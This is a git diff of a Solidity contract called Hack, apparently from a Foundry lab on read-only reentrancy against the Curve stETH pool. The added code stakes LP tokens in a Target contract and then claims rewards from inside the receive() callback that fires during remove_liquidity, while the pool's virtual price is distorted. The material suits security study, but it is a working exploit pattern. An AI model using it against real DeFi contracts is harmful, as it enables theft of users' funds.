@@ -4,6 +4,7 @@ pragma solidity ^0.8.12;
 
 import "../lib/forge-std/src/console.sol";
 import "./interfaces/ICurve.sol";
+import "./Target.sol";
 import "../lib/openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";
 
 contract Hack {
@@ -11,12 +12,26 @@ contract Hack {
     address constant LP = 0x06325440D014e39736583c165C2963BA99fAf14E;
     ICurve private constant pool = ICurve(STETH_POOL);
     IERC20 private constant lpToken = IERC20(LP);
+    Target private immutable target;
+
+    constructor(address _target) {
+        target = Target(_target);
+    }
 
     receive() external payable {
         console.log(
             "During remove LP - vitural price:",
             pool.get_virtual_price()
         );
+        uint reward = target.getReward();
+        console.log("Reward", reward);
+    }
+
+    function setUp() external payable {
+        uint[2] memory amounts = [msg.value, 0];
+        uint lp = pool.add_liquidity{value: msg.value}(amounts, 1);
+        lpToken.approve(address(target), lp);
+        target.stake(lp);
     }
 
     function pwn() external payable {
@@ -28,5 +43,7 @@ contract Hack {
         );
         uint[2] memory min_amounts = [uint(0), uint(0)];
         pool.remove_liquidity(lp, min_amounts);
+        uint reward = target.getReward();
+        console.log("Reward", reward);
     }
 }
